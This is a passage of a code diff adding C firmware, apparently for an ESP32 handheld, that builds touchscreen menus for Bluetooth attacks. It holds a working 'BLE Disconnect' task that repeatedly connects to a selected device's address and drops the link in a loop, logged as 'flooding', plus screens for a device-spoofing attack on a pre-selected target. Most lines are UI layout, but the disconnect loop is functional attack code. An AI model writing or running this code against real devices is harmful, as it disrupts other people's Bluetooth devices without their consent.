+        lv_obj_align(list_lbl, LV_ALIGN_TOP_LEFT, 8, 36);
+
+        lv_obj_t *dev_list = lv_obj_create(function_page);
+        lv_obj_set_size(dev_list, lv_pct(100), 130);
+        lv_obj_align(dev_list, LV_ALIGN_TOP_MID, 0, 52);
+        lv_obj_set_style_bg_color(dev_list, ui_card_color(), 0);
+        lv_obj_set_style_border_width(dev_list, 1, 0);
+        lv_obj_set_style_border_color(dev_list, ui_border_color(), 0);
+        lv_obj_set_style_radius(dev_list, 6, 0);
+        lv_obj_set_flex_flow(dev_list, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_style_pad_all(dev_list, 4, 0);
+        lv_obj_set_scrollbar_mode(dev_list, LV_SCROLLBAR_MODE_AUTO);
+
+        if (bt_device_count == 0) {
+            lv_obj_t *no_dev = lv_label_create(dev_list);
+            lv_label_set_text(no_dev, "No devices — run BLE Scan first");
+            lv_obj_set_style_text_font(no_dev, &lv_font_montserrat_12, 0);
+            lv_obj_set_style_text_color(no_dev, ui_text_color(), 0);
+        } else {
+            for (int i = 0; i < bt_device_count; i++) {
+                bt_device_info_t *d = &bt_devices[i];
+                char mac_s[18]; bt_format_addr(d->addr, mac_s);
+                char row_txt[48];
+                if (d->name[0])
+                    snprintf(row_txt, sizeof(row_txt), "%.16s  %s", d->name, mac_s);
+                else
+                    snprintf(row_txt, sizeof(row_txt), "%s", mac_s);
+                lv_obj_t *row = lv_btn_create(dev_list);
+                lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
+                lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
+                lv_obj_set_style_bg_color(row, ui_accent_color(), LV_STATE_PRESSED);
+                lv_obj_set_style_border_width(row, 0, 0);
+                lv_obj_set_style_radius(row, 4, 0);
+                lv_obj_set_style_pad_all(row, 4, 0);
+                lv_obj_t *row_lbl = lv_label_create(row);
+                lv_label_set_text(row_lbl, row_txt);
+                lv_obj_set_style_text_font(row_lbl, &lv_font_montserrat_12, 0);
+                lv_obj_set_style_text_color(row_lbl, ui_text_color(), 0);
+                lv_label_set_long_mode(row_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                lv_obj_set_width(row_lbl, lv_pct(100));
+                lv_obj_add_event_cb(row, ble_spoof_device_tap_cb, LV_EVENT_CLICKED,
+                                    (void *)(intptr_t)i);
+            }
+        }
+
+        ble_spoof_status_label = lv_label_create(function_page);
+        lv_label_set_text(ble_spoof_status_label, "Tap device to select target");
+        lv_obj_set_style_text_font(ble_spoof_status_label, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(ble_spoof_status_label, ui_text_color(), 0);
+        lv_obj_align(ble_spoof_status_label, LV_ALIGN_TOP_MID, 0, 190);
+    }
+
+    // Start/Stop button — position depends on layout
+    ble_spoof_start_btn = lv_btn_create(function_page);
+    lv_obj_set_size(ble_spoof_start_btn, 140, 42);
+    lv_obj_align(ble_spoof_start_btn, LV_ALIGN_TOP_MID, 0, directed ? 148 : 210);
+    lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(ble_spoof_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(ble_spoof_start_btn, 0, 0);
+    lv_obj_set_style_radius(ble_spoof_start_btn, 10, 0);
+    lv_obj_t *spoof_lbl = lv_label_create(ble_spoof_start_btn);
+    lv_label_set_text(spoof_lbl, "START SPOOF");
+    lv_obj_set_style_text_font(spoof_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(spoof_lbl, lv_color_white(), 0);
+    lv_obj_center(spoof_lbl);
+    lv_obj_add_event_cb(ble_spoof_start_btn, ble_spoof_start_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *bi = lv_label_create(back_btn);
+    lv_label_set_text(bi, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(bi, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bi, lv_color_white(), 0);
+    lv_obj_t *bl = lv_label_create(back_btn);
+    lv_label_set_text(bl, directed ? "Attacks" : "BT Attacks");
+    lv_obj_set_style_text_font(bl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bl, lv_color_white(), 0);
+    lv_obj_add_event_cb(back_btn, ble_spoof_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// ── BLE Disconnect attack screen + task ──────────────────────────────────────
+static int ble_disc_gap_cb(struct ble_gap_event *event, void *arg)
+{
+    (void)arg;
+    if (event->type == BLE_GAP_EVENT_CONNECT) {
+        if (event->connect.status == 0) {
+            ble_disc_conn_handle = event->connect.conn_handle;
+        }
+    } else if (event->type == BLE_GAP_EVENT_DISCONNECT) {
+        ble_disc_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+    }
+    return 0;
+}
+
+static void ble_disc_task(void *pvParameters)
+{
+    (void)pvParameters;
+    bool mac_valid = false;
+    for (int i = 0; i < 6; i++) if (ble_disc_target_mac[i]) { mac_valid = true; break; }
+    if (!mac_valid) {
+        ble_disc_active = false;
+        ble_disc_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    ble_addr_t peer_addr;
+    peer_addr.type = ble_disc_target_addr_type;
+    memcpy(peer_addr.val, ble_disc_target_mac, 6);
+
+    ESP_LOGI(TAG, "BLE Disc: flooding %02X:%02X:%02X:%02X:%02X:%02X",
+             ble_disc_target_mac[0],ble_disc_target_mac[1],ble_disc_target_mac[2],
+             ble_disc_target_mac[3],ble_disc_target_mac[4],ble_disc_target_mac[5]);
+
+    while (ble_disc_active) {
+        ble_disc_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+
+        struct ble_gap_conn_params params;
+        memset(&params, 0, sizeof(params));
+        params.itvl_min = 6;
+        params.itvl_max = 12;
+        params.latency  = 0;
+        params.supervision_timeout = 10;
+        params.scan_itvl = 16;
+        params.scan_window = 16;
+        params.min_ce_len = 0;
+        params.max_ce_len = 0;
+
+        int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &peer_addr, 1000,
+                                 &params, ble_disc_gap_cb, NULL);
+        if (rc == 0) {
+            for (int i = 0; i < 15 && ble_disc_active &&
+                 ble_disc_conn_handle == BLE_HS_CONN_HANDLE_NONE; i++)
+                vTaskDelay(pdMS_TO_TICKS(100));
+
+            if (ble_disc_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
+                ble_gap_terminate(ble_disc_conn_handle,
+                                  BLE_ERR_REM_USER_CONN_TERM);
+                vTaskDelay(pdMS_TO_TICKS(50));
+            } else {
+                ble_gap_conn_cancel();
+            }
+        }
+        ble_disc_count++;
+        ble_disc_needs_ui_update = true;
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    ble_disc_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void ble_disc_start_cb(lv_event_t *e)
+{
+    (void)e;
+    if (ble_disc_active) {
+        ble_disc_active = false;
+        lv_label_set_text(lv_obj_get_child(ble_disc_start_btn, 0), "START");
+        lv_obj_set_style_bg_color(ble_disc_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    } else {
+        bool mac_ready = false;
+        for (int i = 0; i < 6; i++) if (ble_disc_target_mac[i]) { mac_ready = true; break; }
+        if (!mac_ready) {
+            if (ble_disc_status_label) lv_label_set_text(ble_disc_status_label, "Select a target first!");
+            return;
+        }
+        if (!ensure_ble_mode()) {
+            if (ble_disc_status_label) lv_label_set_text(ble_disc_status_label, "BLE init failed!");
+            return;
+        }
+        ble_disc_count = 0;
+        ble_disc_active = true;
+        lv_label_set_text(lv_obj_get_child(ble_disc_start_btn, 0), "STOP");
+        lv_obj_set_style_bg_color(ble_disc_start_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+        xTaskCreate(ble_disc_task, "ble_disc", 4096, NULL, 5, &ble_disc_task_handle);
+    }
+}
+
+static void ble_disc_back_cb(lv_event_t *e)
+{
+    (void)e;
+    ble_disc_active = false;
+    for (int i = 0; i < 20 && ble_disc_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(50));
+    if (ble_disc_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
+        ble_gap_terminate(ble_disc_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+        ble_disc_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+    }
+    ble_disc_ui_active = false;
+    ble_disc_status_label = NULL;
+    ble_disc_counter_label = NULL;
+    ble_disc_start_btn = NULL;
+    ble_disc_target_idx = -1;
+    memset(ble_disc_target_mac, 0, 6);
+    if (current_radio_mode == RADIO_MODE_BLE) {
+        bt_nimble_deinit();
+        current_radio_mode = RADIO_MODE_NONE;
+    }
+    void (*ret)(void) = s_ble_disc_return_fn;
+    s_ble_disc_return_fn = NULL;
+    if (ret) ret(); else show_bt_attacks_screen();
+}
+
+static void ble_disc_device_tap_cb(lv_event_t *e)
+{
+    if (ble_disc_active) return;
+    int idx = (int)(intptr_t)lv_event_get_user_data(e);
+    ble_disc_target_idx = idx;
+    if (idx >= 0 && idx < bt_device_count) {
+        bt_device_info_t *d = &bt_devices[idx];
+        memcpy(ble_disc_target_mac, d->addr, 6);
+        ble_disc_target_addr_type = d->addr_type;
+        if (ble_disc_status_label) {
+            char mac_s[18]; bt_format_addr(d->addr, mac_s);
+            char tbuf[56];
+            if (d->name[0])
+                snprintf(tbuf, sizeof(tbuf), "Target: %s", d->name);
+            else
+                snprintf(tbuf, sizeof(tbuf), "Target: %s", mac_s);
+            lv_label_set_text(ble_disc_status_label, tbuf);
+        }
+    }
+}
+
+static void show_ble_disc_screen(void)
+{
+    create_function_page_base("BLE Disconnect");
+    ble_disc_ui_active = true;
+    // Do NOT reset ble_disc_target_idx here — proceed_from_sas may have pre-set it
+    ble_disc_count = 0;
+
+    bool directed = (ble_disc_target_idx >= 0 && ble_disc_target_idx < bt_device_count);
+
+    if (directed) {
+        // Pre-selected path: show target info card, START immediately
+        bt_device_info_t *d = &bt_devices[ble_disc_target_idx];
+        char mac_s[18]; bt_format_addr(d->addr, mac_s);
+
+        lv_obj_t *card = lv_obj_create(function_page);
+        lv_obj_set_size(card, lv_pct(96), 70);
+        lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 36);
+        lv_obj_set_style_bg_color(card, ui_card_color(), 0);
+        lv_obj_set_style_border_color(card, COLOR_MATERIAL_PINK, 0);
+        lv_obj_set_style_border_width(card, 2, 0);
+        lv_obj_set_style_radius(card, 8, 0);
+        lv_obj_set_style_pad_all(card, 8, 0);
+        lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
+        lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+        lv_obj_t *name_lbl = lv_label_create(card);
+        lv_label_set_text(name_lbl, d->name[0] ? d->name : "(unnamed)");
+        lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
+        lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+        lv_obj_set_width(name_lbl, lv_pct(100));
+
+        lv_obj_t *mac_lbl = lv_label_create(card);
+        lv_label_set_text(mac_lbl, mac_s);
+        lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(mac_lbl, COLOR_MATERIAL_PINK, 0);
+
+        ble_disc_status_label = lv_label_create(function_page);
+        lv_label_set_text(ble_disc_status_label, "Ready - press START");
+        lv_obj_set_style_text_font(ble_disc_status_label, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(ble_disc_status_label, ui_text_color(), 0);
+        lv_obj_align(ble_disc_status_label, LV_ALIGN_TOP_MID, 0, 116);
+
+        ble_disc_counter_label = lv_label_create(function_page);
+        lv_label_set_text(ble_disc_counter_label, "Attempts: 0");
+        lv_obj_set_style_text_font(ble_disc_counter_label, &lv_font_montserrat_16, 0);
+        lv_obj_set_style_text_color(ble_disc_counter_label, COLOR_MATERIAL_ORANGE, 0);
+        lv_obj_align(ble_disc_counter_label, LV_ALIGN_TOP_MID, 0, 136);
+    } else {
+        // Fallback: device selection list
+        ble_disc_target_idx = -1;
+        lv_obj_t *list_lbl = lv_label_create(function_page);
+        lv_label_set_text(list_lbl, "Select target:");
+        lv_obj_set_style_text_font(list_lbl, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(list_lbl, ui_text_color(), 0);
+        lv_obj_align(list_lbl, LV_ALIGN_TOP_LEFT, 8, 36);
+
+        lv_obj_t *dev_list = lv_obj_create(function_page);
+        lv_obj_set_size(dev_list, lv_pct(100), 120);
+        lv_obj_align(dev_list, LV_ALIGN_TOP_MID, 0, 52);
+        lv_obj_set_style_bg_color(dev_list, ui_card_color(), 0);
+        lv_obj_set_style_border_width(dev_list, 1, 0);
+        lv_obj_set_style_border_color(dev_list, ui_border_color(), 0);
+        lv_obj_set_style_radius(dev_list, 6, 0);
+        lv_obj_set_flex_flow(dev_list, LV_FLEX_FLOW_COLUMN);
+        lv_obj_set_style_pad_all(dev_list, 4, 0);
+        lv_obj_set_scrollbar_mode(dev_list, LV_SCROLLBAR_MODE_AUTO);
+
+        if (bt_device_count == 0) {
+            lv_obj_t *no_dev = lv_label_create(dev_list);
+            lv_label_set_text(no_dev, "No devices — run BLE Scan first");
+            lv_obj_set_style_text_font(no_dev, &lv_font_montserrat_12, 0);
+            lv_obj_set_style_text_color(no_dev, ui_text_color(), 0);
+        } else {
+            for (int i = 0; i < bt_device_count; i++) {
+                bt_device_info_t *d = &bt_devices[i];
+                char mac_s[18]; bt_format_addr(d->addr, mac_s);
+                char row_txt[48];
+                if (d->name[0])
+                    snprintf(row_txt, sizeof(row_txt), "%.16s  %s", d->name, mac_s);
+                else
+                    snprintf(row_txt, sizeof(row_txt), "%s", mac_s);
+                lv_obj_t *row = lv_btn_create(dev_list);
+                lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
+                lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
+                lv_obj_set_style_bg_color(row, ui_accent_color(), LV_STATE_PRESSED);
+                lv_obj_set_style_border_width(row, 0, 0);
+                lv_obj_set_style_radius(row, 4, 0);
+                lv_obj_set_style_pad_all(row, 4, 0);
+                lv_obj_t *row_lbl = lv_label_create(row);
+                lv_label_set_text(row_lbl, row_txt);
+                lv_obj_set_style_text_font(row_lbl, &lv_font_montserrat_12, 0);
+                lv_obj_set_style_text_color(row_lbl, ui_text_color(), 0);
+                lv_label_set_long_mode(row_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                lv_obj_set_width(row_lbl, lv_pct(100));
+                lv_obj_add_event_cb(row, ble_disc_device_tap_cb, LV_EVENT_CLICKED,
+                                    (void *)(intptr_t)i);
+            }
+        }
+
+        ble_disc_status_label = lv_label_create(function_page);
+        lv_label_set_text(ble_disc_status_label, "Tap device to select target");
+        lv_obj_set_style_text_font(ble_disc_status_label, &lv_font_montserrat_12, 0);
+        lv_obj_set_style_text_color(ble_disc_status_label, ui_text_color(), 0);
+        lv_obj_align(ble_disc_status_label, LV_ALIGN_TOP_MID, 0, 180);
+
+        ble_disc_counter_label = lv_label_create(function_page);
+        lv_label_set_text(ble_disc_counter_label, "Attempts: 0");
+        lv_obj_set_style_text_font(ble_disc_counter_label, &lv_font_montserrat_16, 0);
+        lv_obj_set_style_text_color(ble_disc_counter_label, COLOR_MATERIAL_ORANGE, 0);
+        lv_obj_align(ble_disc_counter_label, LV_ALIGN_TOP_MID, 0, 198);
+    }
+
+    // Start/Stop button — position depends on layout
+    ble_disc_start_btn = lv_btn_create(function_page);
+    lv_obj_set_size(ble_disc_start_btn, 130, 42);
+    lv_obj_align(ble_disc_start_btn, LV_ALIGN_TOP_MID, 0, directed ? 170 : 232);
+    lv_obj_set_style_bg_color(ble_disc_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(ble_disc_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(ble_disc_start_btn, 0, 0);
+    lv_obj_set_style_radius(ble_disc_start_btn, 10, 0);
+    lv_obj_t *disc_lbl = lv_label_create(ble_disc_start_btn);
+    lv_label_set_text(disc_lbl, "START");
+    lv_obj_set_style_text_font(disc_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(disc_lbl, lv_color_white(), 0);
+    lv_obj_center(disc_lbl);
+    lv_obj_add_event_cb(ble_disc_start_btn, ble_disc_start_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *dbi = lv_label_create(back_btn);
+    lv_label_set_text(dbi, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(dbi, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(dbi, lv_color_white(), 0);
+    lv_obj_t *dbl = lv_label_create(back_btn);
+    lv_label_set_text(dbl, directed ? "Attacks" : "BT Attacks");
+    lv_obj_set_style_text_font(dbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(dbl, lv_color_white(), 0);
+    lv_obj_add_event_cb(back_btn, ble_disc_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
 // ── BT Attacks menu ──────────────────────────────────────────────────────────
+// ── Device Spoof — directed (SAS pre-selected target, no device list) ────────
+static void show_ble_spoof_directed_screen(void)
+{
+    create_function_page_base("Device Spoof");
+    ble_spoof_ui_active = true;
+
+    char mac_s[18];
+    bt_format_addr(bt_sas_target_addr, mac_s);
+
+    // Target info card
+    lv_obj_t *card = lv_obj_create(function_page);
+    lv_obj_set_size(card, lv_pct(96), 70);
+    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 36);
+    lv_obj_set_style_bg_color(card, ui_card_color(), 0);
+    lv_obj_set_style_border_color(card, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_border_width(card, 2, 0);
+    lv_obj_set_style_radius(card, 8, 0);
+    lv_obj_set_style_pad_all(card, 8, 0);
+    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *name_lbl = lv_label_create(card);
+    lv_label_set_text(name_lbl, bt_sas_target_name[0] ? bt_sas_target_name : "(unnamed)");
+    lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
+    lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+    lv_obj_set_width(name_lbl, lv_pct(100));
+
+    lv_obj_t *mac_lbl = lv_label_create(card);
+    lv_label_set_text(mac_lbl, mac_s);
+    lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(mac_lbl, COLOR_MATERIAL_ORANGE, 0);
+
+    // Status label
+    ble_spoof_status_label = lv_label_create(function_page);
+    lv_label_set_text(ble_spoof_status_label, "Ready - press START SPOOF");
+    lv_obj_set_style_text_font(ble_spoof_status_label, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(ble_spoof_status_label, ui_text_color(), 0);
+    lv_obj_align(ble_spoof_status_label, LV_ALIGN_TOP_MID, 0, 116);
+
+    // Start/Stop button
+    ble_spoof_start_btn = lv_btn_create(function_page);
+    lv_obj_set_size(ble_spoof_start_btn, 140, 42);
+    lv_obj_align(ble_spoof_start_btn, LV_ALIGN_TOP_MID, 0, 148);
+    lv_obj_set_style_bg_color(ble_spoof_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(ble_spoof_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(ble_spoof_start_btn, 0, 0);
+    lv_obj_set_style_radius(ble_spoof_start_btn, 10, 0);
+    lv_obj_t *sl = lv_label_create(ble_spoof_start_btn);
+    lv_label_set_text(sl, "START SPOOF");
+    lv_obj_set_style_text_font(sl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(sl, lv_color_white(), 0);
+    lv_obj_center(sl);
+    lv_obj_add_event_cb(ble_spoof_start_btn, ble_spoof_start_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *bi = lv_label_create(back_btn);
+    lv_label_set_text(bi, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(bi, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bi, lv_color_white(), 0);
+    lv_obj_t *bl = lv_label_create(back_btn);
+    lv_label_set_text(bl, "Attacks");
+    lv_obj_set_style_text_font(bl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(bl, lv_color_white(), 0);
+    lv_obj_add_event_cb(back_btn, ble_spoof_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// ── BLE Disconnect — directed (SAS pre-selected target, no device list) ───────
+static void show_ble_disc_directed_screen(void)
+{
+    create_function_page_base("BLE Disconnect");
+    ble_disc_ui_active = true;
+    ble_disc_count = 0;
+
+    char mac_s[18];
+    bt_format_addr(bt_sas_target_addr, mac_s);
+
+    // Target info card
+    lv_obj_t *card = lv_obj_create(function_page);
+    lv_obj_set_size(card, lv_pct(96), 70);
+    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 36);
+    lv_obj_set_style_bg_color(card, ui_card_color(), 0);
+    lv_obj_set_style_border_color(card, COLOR_MATERIAL_PINK, 0);
+    lv_obj_set_style_border_width(card, 2, 0);
+    lv_obj_set_style_radius(card, 8, 0);
+    lv_obj_set_style_pad_all(card, 8, 0);
+    lv_obj_set_flex_flow(card, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(card, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
+    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *name_lbl = lv_label_create(card);
+    lv_label_set_text(name_lbl, bt_sas_target_name[0] ? bt_sas_target_name : "(unnamed)");
+    lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(name_lbl, ui_text_color(), 0);
+    lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_DOT);
+    lv_obj_set_width(name_lbl, lv_pct(100));
+
+    lv_obj_t *mac_lbl = lv_label_create(card);
+    lv_label_set_text(mac_lbl, mac_s);
+    lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(mac_lbl, COLOR_MATERIAL_PINK, 0);
+
+    // Status label
+    ble_disc_status_label = lv_label_create(function_page);
+    lv_label_set_text(ble_disc_status_label, "Ready - press START");
+    lv_obj_set_style_text_font(ble_disc_status_label, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(ble_disc_status_label, ui_text_color(), 0);
+    lv_obj_align(ble_disc_status_label, LV_ALIGN_TOP_MID, 0, 116);
+
+    // Attempt counter
+    ble_disc_counter_label = lv_label_create(function_page);
+    lv_label_set_text(ble_disc_counter_label, "Attempts: 0");
+    lv_obj_set_style_text_font(ble_disc_counter_label, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_color(ble_disc_counter_label, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_align(ble_disc_counter_label, LV_ALIGN_TOP_MID, 0, 136);
+
+    // Start/Stop button
+    ble_disc_start_btn = lv_btn_create(function_page);
+    lv_obj_set_size(ble_disc_start_btn, 130, 42);
+    lv_obj_align(ble_disc_start_btn, LV_ALIGN_TOP_MID, 0, 170);
+    lv_obj_set_style_bg_color(ble_disc_start_btn, COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(ble_disc_start_btn, lv_color_lighten(COLOR_MATERIAL_GREEN, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(ble_disc_start_btn, 0, 0);
+    lv_obj_set_style_radius(ble_disc_start_btn, 10, 0);
+    lv_obj_t *dl = lv_label_create(ble_disc_start_btn);
+    lv_label_set_text(dl, "START");
+    lv_obj_set_style_text_font(dl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(dl, lv_color_white(), 0);
+    lv_obj_center(dl);
+    lv_obj_add_event_cb(ble_disc_start_btn, ble_disc_start_cb, LV_EVENT_CLICKED, NULL);
+
+    // Back button
+    lv_obj_t *back_btn = lv_btn_create(function_page);
+    lv_obj_set_size(back_btn, 110, 28);
+    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(back_btn, 0, 0);
+    lv_obj_set_style_radius(back_btn, 8, 0);
+    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(back_btn, 4, 0);
+    lv_obj_t *dbi = lv_label_create(back_btn);
+    lv_label_set_text(dbi, LV_SYMBOL_LEFT);
+    lv_obj_set_style_text_font(dbi, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(dbi, lv_color_white(), 0);
+    lv_obj_t *dbl = lv_label_create(back_btn);
+    lv_label_set_text(dbl, "Attacks");
+    lv_obj_set_style_text_font(dbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(dbl, lv_color_white(), 0);
+    lv_obj_add_event_cb(back_btn, ble_disc_back_cb, LV_EVENT_CLICKED, NULL);
+}
+
+// ── Directed BT Attacks screen (SAS context — target from Scan & Select) ─────
+static void show_directed_bt_attacks_screen(void)
+{
+    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+    reset_function_page_children();
+
+    char title[48];
+    snprintf(title, sizeof(title), "Target: %.26s", bt_sas_target_name[0] ? bt_sas_target_name : "Unknown");
+    create_function_page_base(title);
+    apply_menu_bg();
+
+    lv_obj_t *tiles = lv_obj_create(function_page);
+    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30 - 44);
+    lv_obj_align(tiles, LV_ALIGN_TOP_MID, 0, 30);
+    lv_obj_set_style_bg_opa(tiles, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(tiles, 0, 0);
+    lv_obj_set_style_pad_all(tiles, 10, 0);
+    lv_obj_set_style_pad_gap(tiles, 10, 0);
+    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
+    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER);
+
